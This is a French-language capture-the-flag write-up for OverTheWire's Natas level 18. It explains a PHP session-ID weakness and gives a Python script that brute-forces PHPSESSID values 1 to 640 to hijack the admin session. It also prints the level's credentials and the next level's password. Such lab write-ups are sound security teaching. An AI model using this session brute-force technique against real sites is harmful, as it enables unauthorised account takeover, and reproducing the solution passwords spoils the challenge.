## Connexion (username=natas18 password=fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op)
```
http://natas18.natas.labs.overthewire.org/
```

## Recherche du mot de passe
Le code php utilise une session. Pour ce faire il faut que la méthode my_session_start() retourne true.

Pour ça il faut que PHPSESSID = un chiffre entre 1 et 640. Puisque 640 représente le maximum.

Parmi ces sessions, il y en a une qui représentera admin et aura _SESSION["admin"] == 1

Ainsi on verra le contenu de print_credentials()

```python
import requests

url = "http://natas18.natas.labs.overthewire.org/index.php"
header = {
    "Authorization": "Basic bmF0YXMxODpmREduMkE2R3NjMEJVcDNiWncwUk5YcGcwUFp0NDBvcA=="
}
with requests.Session() as session:
    for i in range(1, 641):
        header["Cookie"] = f"PHPSESSID={i}"
        session.headers.update(header)
        response = session.get(url)
        if "regular user" not in response.text:
            print(f"The phpsession id is {i}")
            print(response.text)
            break
```

## Prochain mot de passe
```
qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT
```